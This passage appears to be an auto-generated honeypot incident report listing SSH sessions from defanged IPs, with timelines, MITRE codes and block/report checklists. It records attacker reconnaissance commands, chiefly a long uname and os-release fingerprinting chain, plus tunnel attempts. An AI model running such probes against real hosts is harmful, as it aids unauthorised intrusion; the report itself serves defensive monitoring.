| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:48:16` | `cowrie.session.connect` |
| `2026-07-08 17:48:16` | `cowrie.client.version` |
| `2026-07-08 17:48:16` | `cowrie.client.kex` |
| `2026-07-08 17:48:17` | `cowrie.login.success` |
| `2026-07-08 17:48:18` | `cowrie.session.params` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.success` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:18` | `cowrie.command.input` |
| `2026-07-08 17:48:19` | `cowrie.log.closed` |
| `2026-07-08 17:48:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a080a4c6c963

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 17:49 |
| **Last Seen** | 2026-07-08 17:49 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:49:32` | `cowrie.session.connect` |
| `2026-07-08 17:49:33` | `cowrie.client.version` |
| `2026-07-08 17:49:33` | `cowrie.client.kex` |
| `2026-07-08 17:49:38` | `cowrie.login.success` |
| `2026-07-08 17:49:42` | `cowrie.session.params` |
| `2026-07-08 17:49:42` | `cowrie.command.input` |
| `2026-07-08 17:49:43` | `cowrie.log.closed` |
| `2026-07-08 17:49:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-69d3d566d6a1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:50 |
| **Last Seen** | 2026-07-08 17:50 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:50:39` | `cowrie.session.connect` |
| `2026-07-08 17:50:39` | `cowrie.client.version` |
| `2026-07-08 17:50:39` | `cowrie.client.kex` |
| `2026-07-08 17:50:40` | `cowrie.login.success` |
| `2026-07-08 17:50:41` | `cowrie.session.params` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.success` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:41` | `cowrie.command.input` |
| `2026-07-08 17:50:42` | `cowrie.log.closed` |
| `2026-07-08 17:50:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5322d06d9e1a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:53 |
| **Last Seen** | 2026-07-08 17:53 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:53:04` | `cowrie.session.connect` |
| `2026-07-08 17:53:04` | `cowrie.client.version` |
| `2026-07-08 17:53:04` | `cowrie.client.kex` |
| `2026-07-08 17:53:06` | `cowrie.login.success` |
| `2026-07-08 17:53:07` | `cowrie.session.params` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.success` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:07` | `cowrie.command.input` |
| `2026-07-08 17:53:08` | `cowrie.log.closed` |
| `2026-07-08 17:53:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-34c86a42067c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:55 |
| **Last Seen** | 2026-07-08 17:55 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:55:31` | `cowrie.session.connect` |
| `2026-07-08 17:55:31` | `cowrie.client.version` |
| `2026-07-08 17:55:31` | `cowrie.client.kex` |
| `2026-07-08 17:55:32` | `cowrie.login.success` |
| `2026-07-08 17:55:34` | `cowrie.session.params` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.success` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.command.input` |
| `2026-07-08 17:55:34` | `cowrie.log.closed` |
| `2026-07-08 17:55:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f88f81e154d

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 17:57 |
| **Last Seen** | 2026-07-08 17:57 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:57:45` | `cowrie.session.connect` |
| `2026-07-08 17:57:47` | `cowrie.client.version` |
| `2026-07-08 17:57:47` | `cowrie.client.kex` |
| `2026-07-08 17:57:52` | `cowrie.login.success` |
| `2026-07-08 17:57:54` | `cowrie.session.params` |
| `2026-07-08 17:57:54` | `cowrie.command.input` |
| `2026-07-08 17:57:55` | `cowrie.log.closed` |
| `2026-07-08 17:57:55` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9589f74539c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 17:57 |
| **Last Seen** | 2026-07-08 17:58 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:57:58` | `cowrie.session.connect` |
| `2026-07-08 17:57:58` | `cowrie.client.version` |
| `2026-07-08 17:57:58` | `cowrie.client.kex` |
| `2026-07-08 17:57:59` | `cowrie.login.success` |
| `2026-07-08 17:58:00` | `cowrie.session.params` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.success` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:00` | `cowrie.command.input` |
| `2026-07-08 17:58:01` | `cowrie.log.closed` |
| `2026-07-08 17:58:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6635da68c0eb

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]114` |
| **First Seen** | 2026-07-08 17:58 |
| **Last Seen** | 2026-07-08 17:58 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:58:00` | `cowrie.session.connect` |
| `2026-07-08 17:58:00` | `cowrie.client.version` |
| `2026-07-08 17:58:01` | `cowrie.client.kex` |
| `2026-07-08 17:58:01` | `cowrie.login.success` |
| `2026-07-08 17:58:02` | `cowrie.session.params` |
| `2026-07-08 17:58:02` | `cowrie.command.input` |
| `2026-07-08 17:58:03` | `cowrie.log.closed` |
| `2026-07-08 17:58:03` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]114` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-053f3a7acb3f

| Field | Detail |
|---|---|
| **Source IP** | `2.58.172[.]185` |
| **First Seen** | 2026-07-08 17:58 |
| **Last Seen** | 2026-07-08 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 17:58:55` | `cowrie.session.connect` |
| `2026-07-08 17:58:55` | `cowrie.client.version` |
| `2026-07-08 17:58:55` | `cowrie.client.kex` |
| `2026-07-08 17:58:55` | `cowrie.login.success` |
| `2026-07-08 17:58:56` | `cowrie.session.params` |
| `2026-07-08 17:58:56` | `cowrie.command.input` |
| `2026-07-08 17:58:56` | `cowrie.log.closed` |
| `2026-07-08 17:58:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `2.58.172[.]185` to AbuseIPDB if not already reported
- [ ] Block `2.58.172[.]185` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6c81a72f3bb0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:00 |
| **Last Seen** | 2026-07-08 18:00 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:00:29` | `cowrie.session.connect` |
| `2026-07-08 18:00:30` | `cowrie.client.version` |
| `2026-07-08 18:00:30` | `cowrie.client.kex` |
| `2026-07-08 18:00:31` | `cowrie.login.success` |
| `2026-07-08 18:00:32` | `cowrie.session.params` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.success` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.command.input` |
| `2026-07-08 18:00:32` | `cowrie.log.closed` |
| `2026-07-08 18:00:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d126dca4c726

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:02 |
| **Last Seen** | 2026-07-08 18:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:02:59` | `cowrie.session.connect` |
| `2026-07-08 18:02:59` | `cowrie.client.version` |
| `2026-07-08 18:02:59` | `cowrie.client.kex` |
| `2026-07-08 18:03:00` | `cowrie.login.success` |
| `2026-07-08 18:03:01` | `cowrie.session.params` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.success` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:01` | `cowrie.command.input` |
| `2026-07-08 18:03:02` | `cowrie.log.closed` |
| `2026-07-08 18:03:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e554c4d4a378

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:05 |
| **Last Seen** | 2026-07-08 18:05 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:05:28` | `cowrie.session.connect` |
| `2026-07-08 18:05:29` | `cowrie.client.version` |
| `2026-07-08 18:05:29` | `cowrie.client.kex` |
| `2026-07-08 18:05:30` | `cowrie.login.success` |
| `2026-07-08 18:05:32` | `cowrie.session.params` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.success` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.command.input` |
| `2026-07-08 18:05:32` | `cowrie.log.closed` |
| `2026-07-08 18:05:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7aa86a76254f

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-07-08 18:07 |
| **Last Seen** | 2026-07-08 18:08 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:07:52` | `cowrie.session.connect` |
| `2026-07-08 18:07:53` | `cowrie.client.version` |
| `2026-07-08 18:07:53` | `cowrie.client.kex` |
| `2026-07-08 18:07:59` | `cowrie.login.success` |
| `2026-07-08 18:08:02` | `cowrie.session.params` |
| `2026-07-08 18:08:02` | `cowrie.command.input` |
| `2026-07-08 18:08:04` | `cowrie.log.closed` |
| `2026-07-08 18:08:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bafc758655c6

| Field | Detail |
|---|---|
| **Source IP** | `91.92.40[.]176` |
| **First Seen** | 2026-07-08 18:07 |
| **Last Seen** | 2026-07-08 18:07 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:07:53` | `cowrie.session.connect` |
| `2026-07-08 18:07:53` | `cowrie.client.version` |
| `2026-07-08 18:07:53` | `cowrie.client.kex` |
| `2026-07-08 18:07:54` | `cowrie.login.success` |
| `2026-07-08 18:07:56` | `cowrie.session.params` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.success` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.command.input` |
| `2026-07-08 18:07:56` | `cowrie.log.closed` |
| `2026-07-08 18:07:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.40[.]176` to AbuseIPDB if not already reported
- [ ] Block `91.92.40[.]176` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-746d9a60f227

| Field | Detail |
|---|---|
| **Source IP** | `65.20.134[.]97` |
| **First Seen** | 2026-07-08 18:08 |
| **Last Seen** | 2026-07-08 18:08 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:08:26` | `cowrie.session.connect` |
| `2026-07-08 18:08:27` | `cowrie.client.version` |
| `2026-07-08 18:08:27` | `cowrie.client.kex` |
| `2026-07-08 18:08:28` | `cowrie.login.success` |
| `2026-07-08 18:08:29` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:08:33` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `65.20.134[.]97` to AbuseIPDB if not already reported
- [ ] Block `65.20.134[.]97` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-576e910c7ce9

| Field | Detail |
|---|---|
| **Source IP** | `60.223.245[.]120` |
| **First Seen** | 2026-07-08 18:08 |
| **Last Seen** | 2026-07-08 18:08 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-08 18:08:35` | `cowrie.session.connect` |
| `2026-07-08 18:08:36` | `cowrie.client.version` |
| `2026-07-08 18:08:36` | `cowrie.client.kex` |
| `2026-07-08 18:08:38` | `cowrie.login.success` |
| `2026-07-08 18:08:39` | `cowrie.direct-tcpip.request` |
| `2026-07-08 18:08:43` | `cowrie.session.closed` |

**Recommended Actions:**
